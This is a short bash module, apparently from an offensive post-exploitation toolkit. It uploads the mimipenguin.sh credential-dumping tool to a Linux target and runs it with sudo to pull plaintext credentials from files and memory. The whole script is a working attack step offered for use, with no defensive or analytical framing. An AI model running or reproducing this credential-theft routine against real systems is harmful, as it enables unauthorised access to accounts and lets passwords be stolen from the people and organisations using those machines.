#!/bin/bash

: '
download mimipenguin.sh and find credentials in files and memory (root required)
'

LOCATION="${SCRIPTS_DIR}/reconnaissance/linux/.files"
FILE="mimipenguin.sh"

curl_upload_file "${LOCATION}" "${FILE}"
sleep 3

execute_command "sudo bash mimipenguin.sh"
create_new_line
